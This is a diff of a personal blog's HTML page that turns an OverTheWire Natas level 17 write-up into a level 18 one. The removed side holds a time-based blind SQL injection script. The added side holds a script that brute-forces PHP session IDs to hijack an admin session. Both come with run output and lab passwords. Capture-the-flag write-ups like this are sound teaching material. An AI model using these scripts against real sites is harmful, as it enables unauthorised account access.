@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection  | Natas-Level 17</title>
+	<title>My messy collection  | Natas-Level 18</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.133.0">
 	
@@ -151,7 +151,7 @@ onload='renderMathInElement(document.body);'></script>
 		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
 	</h2>
 </div>
-<h1 class="pt-2">Natas-Level 17</h1>
+<h1 class="pt-2">Natas-Level 18</h1>
 
 <h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
 
@@ -186,7 +186,7 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 </div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
-		datetime="2024-08-25T21:17:22&#43;03:00">2024-8-25</time>
+		datetime="2024-08-26T14:47:03&#43;03:00">2024-8-26</time>
 </div>
 
 <hr />
@@ -200,24 +200,21 @@ onload='renderMathInElement(document.body);'></script>
 <article>
 	<section class="mx-auto content">
 		<div class="c-rich-text"><h3 id="login">Login</h3>
-<p><em>Username: natas17</em><br>
-<em>Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC</em><br>
-<em>URL:      <a href="http://natas17.natas.labs.overthewire.org">http://natas17.natas.labs.overthewire.org</a></em></p>
-<h4 id="solution-ideahttpsmediumcomsamarthkokil64overthewire-updated-natas-walkthrough-level-17-00dd519c7689"><a href="https://medium.com/@samarthkokil64/overthewire-updated-natas-walkthrough-level-17-00dd519c7689">Solution idea</a></h4>
+<p><em>Username: natas18</em><br>
+<em>Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ</em><br>
+<em>URL:      <a href="http://natas18.natas.labs.overthewire.org">http://natas18.natas.labs.overthewire.org</a></em></p>
 <h3 id="doc">Doc</h3>
 <p><a href="https://en.wikipedia.org/wiki/Brute-force_attack">What is brute-forcing?</a><br>
 In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.<br>
 <a href="https://en.wikipedia.org/wiki/Python_(programming_language)">What is python?</a><br>
 Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.<br>
 <a href="https://en.wikipedia.org/wiki/PHP">What is php?</a><br>
-PHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.<br>
-<a href="https://en.wikipedia.org/wiki/SQL">What is SQL?</a><br>
-Structured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables.<br>
-<a href="https://en.wikipedia.org/wiki/SQL_injection">What is SQL injection?</a><br>
-In computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.</p>
+PHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.</p>
 <h3 id="solution">Solution</h3>
-<p>The index page of <strong>natas17</strong> presents us with a <strong>Username</strong> field and a <strong>check existance</strong> button just like in the previous levels.</p>
-<p>Let`s check the Source code:
+<p>Firstly, the index page of <strong>natas18</strong> displays a standard login prompt, asking you for a username and a password to login.</p>
+<img src="/img/natas/natas18-1.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<br>
+Let`s take a look under the hood:
 <div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">html</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">head</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
@@ -227,126 +224,206 @@ In computing, SQL injection is a code injection technique used to attack data-dr
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">http://natas.labs.overthewire.org/js/wechall-data.js</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">script</span> <span style="color:#75af00">src</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#00a8c8">var</span> <span style="color:#75af00">wechallinfo</span> <span style="color:#f92672">=</span> <span style="color:#111">{</span> <span style="color:#d88200">&#34;level&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;natas17&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;pass&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;&lt;censored&gt;&#34;</span> <span style="color:#111">};&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">head</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#00a8c8">var</span> <span style="color:#75af00">wechallinfo</span> <span style="color:#f92672">=</span> <span style="color:#111">{</span> <span style="color:#d88200">&#34;level&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;natas18&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;pass&#34;</span><span style="color:#f92672">:</span> <span style="color:#d88200">&#34;&lt;censored&gt;&#34;</span> <span style="color:#111">};&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">head</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>natas17<span style="color:#111">&lt;/</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>natas18<span style="color:#111">&lt;/</span><span style="color:#f92672">h1</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?php
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">CREATE TABLE `users` (
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  `username` varchar(64) DEFAULT NULL,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  `password` varchar(64) DEFAULT NULL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">$maxid = 640; // 640 should be enough for everyone
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if(array_key_exists(&#34;username&#34;, $_REQUEST)) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $link = mysqli_connect(&#39;localhost&#39;, &#39;natas17&#39;, &#39;&lt;censored&gt;&#39;);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    mysqli_select_db($link, &#39;natas17&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">function isValidAdminLogin() { /* {{{ */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if($_REQUEST[&#34;username&#34;] == &#34;admin&#34;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    /* This method of authentication appears to be unsafe and has been disabled for now. */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        //return 1;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    return 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">function isValidID($id) { /* {{{ */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    return is_numeric($id);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">function createID($user) { /* {{{ */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    global $maxid;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    return rand(1, $maxid);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">function debug($msg) { /* {{{ */
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(array_key_exists(&#34;debug&#34;, $_GET)) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        echo &#34;Executing query: $query&lt;br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        print &#34;DEBUG: $msg&lt;br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">function my_session_start() { /* {{{ */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(array_key_exists(&#34;PHPSESSID&#34;, $_COOKIE) and isValidID($_COOKIE[&#34;PHPSESSID&#34;])) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(!session_start()) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        debug(&#34;Session start failed&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        return false;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        debug(&#34;Session start ok&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        if(!array_key_exists(&#34;admin&#34;, $_SESSION)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        debug(&#34;Session was old: admin flag set&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        $_SESSION[&#34;admin&#34;] = 0; // backwards compatible, secure
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        return true;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $res = mysqli_query($link, $query);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if($res) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(mysqli_num_rows($res) &gt; 0) {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        //echo &#34;This user exists.&lt;br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    return false;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">function print_credentials() { /* {{{ */
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if($_SESSION and array_key_exists(&#34;admin&#34;, $_SESSION) and $_SESSION[&#34;admin&#34;] == 1) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    print &#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    print &#34;&lt;pre&gt;Username: natas19\n&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    print &#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        //echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    print &#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&#34;;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        //echo &#34;Error in query.&lt;br&gt;&#34;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    mysqli_close($link);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">$showform = true;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if(my_session_start()) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    print_credentials();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $showform = false;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">} else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(array_key_exists(&#34;username&#34;, $_REQUEST) &amp;&amp; array_key_exists(&#34;password&#34;, $_REQUEST)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    session_id(createID($_REQUEST[&#34;username&#34;]));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    session_start();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $_SESSION[&#34;admin&#34;] = isValidAdminLogin();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    debug(&#34;New session started&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $showform = false;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    print_credentials();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if($showform) {
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">p</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span>Please login with your admin account to retrieve credentials for natas19.
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">p</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">form</span> <span style="color:#75af00">action</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index.php&#34;</span> <span style="color:#75af00">method</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;POST&#34;</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span>Username: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;Check existence&#34;</span> <span style="color:#111">/&gt;</span>
+</span></span><span style="display:flex;"><span>Password: <span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;password&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">br</span><span style="color:#111">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">input</span> <span style="color:#75af00">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;submit&#34;</span> <span style="color:#75af00">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;Login&#34;</span> <span style="color:#111">/&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">form</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?php } ?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;</span><span style="color:#f92672">div</span> <span style="color:#75af00">id</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;viewsource&#34;</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">a</span> <span style="color:#75af00">href</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;index-source.html&#34;</span><span style="color:#111">&gt;</span>View sourcecode<span style="color:#111">&lt;/</span><span style="color:#f92672">a</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">div</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">body</span><span style="color:#111">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#111">&lt;/</span><span style="color:#f92672">html</span><span style="color:#111">&gt;</span></span></span></code></pre></div>
-This solution seems to be based again on some sort of SQL injection. Let`s break down the code and find the important snippets.</p>
-<pre tabindex="0"><code>if(array_key_exists(&#34;username&#34;, $_REQUEST)) {
-    $link = mysqli_connect(&#39;localhost&#39;, &#39;natas17&#39;, &#39;&lt;censored&gt;&#39;);
-    mysqli_select_db($link, &#39;natas17&#39;);
+<h4 id="code-explanaiton">Code explanaiton</h4>
+<p>The code selections that should interest us are:</p>
+<pre tabindex="0"><code>$maxid = 640; // 640 should be enough for everyone
 
-    $query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34;&#34;;
-    if(array_key_exists(&#34;debug&#34;, $_GET)) {
-        echo &#34;Executing query: $query&lt;br&gt;&#34;;
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST[&#34;username&#34;] == &#34;admin&#34;) {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
     }
 
-    $res = mysqli_query($link, $query);
-    if($res) {
-    if(mysqli_num_rows($res) &gt; 0) {
-        //echo &#34;This user exists.&lt;br&gt;&#34;;
+    return 0;
+}
+</code></pre><p>And:</p>
+<pre tabindex="0"><code>function my_session_start() { /* {{{ */
+    if(array_key_exists(&#34;PHPSESSID&#34;, $_COOKIE) and isValidID($_COOKIE[&#34;PHPSESSID&#34;])) {
+    if(!session_start()) {
+        debug(&#34;Session start failed&#34;);
+        return false;
     } else {
-        //echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+        debug(&#34;Session start ok&#34;);
+        if(!array_key_exists(&#34;admin&#34;, $_SESSION)) {
+        debug(&#34;Session was old: admin flag set&#34;);
+        $_SESSION[&#34;admin&#34;] = 0; // backwards compatible, secure
+        }
+        return true;
     }
-    } else {
-        //echo &#34;Error in query.&lt;br&gt;&#34;;
     }
 
-    mysqli_close($link);
-} 
-</code></pre><p>This seems to be the part where the magic happens. It is very similar to a SQL injection we used previously, the caviat here being that there`s no ouput so we can not be sure if the data we bring into the equation is correct or not. We could use a timeout after the query tho in order to see what happens since if the query is returning somehting, the timeout will execute, otherwise it will just skip to the next iteration.<br>
-For that, a script similar to the last SQL injection will be necessary. We can just slightly modify the already completed script in order to adapt it to <strong>natas17</strong>.<br>
-<strong>Code:</strong></p>
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists(&#34;admin&#34;, $_SESSION) and $_SESSION[&#34;admin&#34;] == 1) {
+    print &#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;;
+    print &#34;&lt;pre&gt;Username: natas19\n&#34;;
+    print &#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;;
+    } else {
+    print &#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&#34;;
+    }
+}
+</code></pre><p>We are presented with an early variable definition of <strong>maxid = 640</strong>.<br>
+Trying to log into admin will not get you anywhere since the request has to be made from a certain unknown id in order for the request to pass.</p>
+<img src="/img/natas/natas18-2.png" alt="gif" style="display: block; margin-left: auto; margin-right: auto;">
+<h4 id="what-is-there-left-to-do">What is there left to do?</h4>
+<p>Since we know the id range we should look into, a simple brute-force script that tries to login on every single seesion id should do the trick. Python will come to the rescue once again.<br>
+<strong>Python script:</strong></p>
 <pre tabindex="0"><code>import requests
-import re
-from time import *
 
-characters = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;
-
-username = &#34;natas17&#34;
-password = &#34;EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC&#34;
-
-Url = &#34;http://natas17.natas.labs.overthewire.org&#34;
-
-session = requests.session()
-
-current_password = list()
-
-while(True):
-    for character in characters:
-        print(&#34;Trying with: &#34; + &#34;&#34;.join(current_password) + character)
-        startTime = time()
-        response = session.post(Url, data={&#34;username&#34;: &#39;natas18&#34; AND password LIKE BINARY &#34;&#39; + &#34;&#34;.join(current_password) + character + &#39;%&#34; AND SLEEP(2) #&#39;},auth=(username, password))
-        endTime = time()
-        if endTime - startTime &gt; 2:
-            current_password.append(character)
-            break
-    if len(current_password) == 32:
-            break
-</code></pre><p><strong>Script run:</strong></p>
-<pre tabindex="0"><code>02:28:04 archie@Archie py → python3 script.py
-Trying with: a
-Trying with: b
-Trying with: c
-Trying with: d
-Trying with: e
-Trying with: f
-Trying with: g
-Trying with: h
-Trying with: i
-Trying with: j
-Trying with: k
-Trying with: l
-Trying with: m
-Trying with: n
-Trying with: o
+target = &#39;http://natas18.natas.labs.overthewire.org&#39;
+auth = (&#39;natas18&#39;,&#39;6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ&#39;)
+params = dict(username=&#39;admin&#39;, password=&#39;admin&#39;)
+cookies = dict()
+max_s_id = 640
+s_id = 1
+while s_id &lt;= max_s_id:
+	print (&#34;ID = &#34; + str(s_id))
+	cookies = dict(PHPSESSID=str(s_id))
+	r = requests.get(target, auth=auth, params=params, cookies=cookies)
+	if &#34;You are an admin&#34; in r.text:
+		print (r.text)
+		break
+	s_id += 1
+</code></pre><p>This basically tries to send a packet for each id from 1 to the max declared id and when it get`s the return that &ldquo;You are an admin&rdquo; breaks. Another possible approach would be to use burp suite to traverse all the possible id`s in an attack and look through the responses for the admin breakpoint.
+<strong>Code running:</strong></p>
+<pre tabindex="0"><code>03:11:53 archie@Archie py → python3 script.py
+ID = 1
+ID = 2
+ID = 3
+ID = 4
+ID = 5
+ID = 6
+ID = 7
+ID = 8
+ID = 9
 .
 .
 .
-Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
-</code></pre><p><strong>The code is not my intelectual property and was adapted from &ldquo;see header&rdquo;.</strong></p>
+ID = 109
+ID = 110
+ID = 111
+ID = 112
+ID = 113
+ID = 114
+ID = 115
+ID = 116
+ID = 117
+ID = 118
+ID = 119
+&lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;http://natas.labs.overthewire.org/css/level.css&#34;&gt;
+&lt;link rel=&#34;stylesheet&#34; href=&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34; /&gt;
+&lt;link rel=&#34;stylesheet&#34; href=&#34;http://natas.labs.overthewire.org/css/wechall.css&#34; /&gt;
+&lt;script src=&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;&gt;&lt;/script&gt;
+&lt;script src=&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &#34;level&#34;: &#34;natas18&#34;, &#34;pass&#34;: &#34;6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ&#34; };&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas18&lt;/h1&gt;
+&lt;div id=&#34;content&#34;&gt;
+You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr&lt;/pre&gt;&lt;div id=&#34;viewsource&#34;&gt;&lt;a href=&#34;index-source.html&#34;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>As you can see, <strong>the correct session id was 119</strong> and sending a packet with that id select as your cookie grants us access to <strong>natas19</strong>.</p>
 </div>
 	</section>
 
@@ -457,7 +534,7 @@ Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
 		<br />
-		714 words in this page.
+		992 words in this page.
 	</div>
 </div>
 
@@ -468,21 +545,14 @@ Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 <hr class="double-line" />
 <div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
     
-    <a class="flex-grow-0" href="/post/natas16/">
+    <a class="flex-grow-0" href="/post/natas17/">
         <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
             height="24">
             <path fill="none" d="M0 0h24v24H0z" />
             <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
-        Natas-Level 16
+        Natas-Level 17
     </a>
     
-    
-    <a class="flex-grow-0" href="/post/natas18/">
-        Natas18
-        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
-            height="24">
-            <path fill="none" d="M0 0h24v24H0z" />
-            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
     
 </div>
 <div >
@@ -492,6 +562,8 @@ Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 <div class="font-serif pb-2 flex align-start leading-loose">
 	<span class="heading pr-6 leading-loose">Related</span>
 	<span >
+		
+			<a href="/post/natas17/">Natas-Level 17</a>&nbsp;&nbsp;&#47;&nbsp;
 		
 			<a href="/post/natas16/">Natas-Level 16</a>&nbsp;&nbsp;&#47;&nbsp;
 		
@@ -519,9 +591,7 @@ Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 		
 			<a href="/post/natas4/">Natas-Level 4</a>&nbsp;&nbsp;&#47;&nbsp;
 		
-			<a href="/post/natas3/">Natas-Level 3</a>&nbsp;&nbsp;&#47;&nbsp;
-		
-			<a href="/post/natas2/">Natas-Level 2</a>
+			<a href="/post/natas3/">Natas-Level 3</a>
 		
 </span>
 </div>
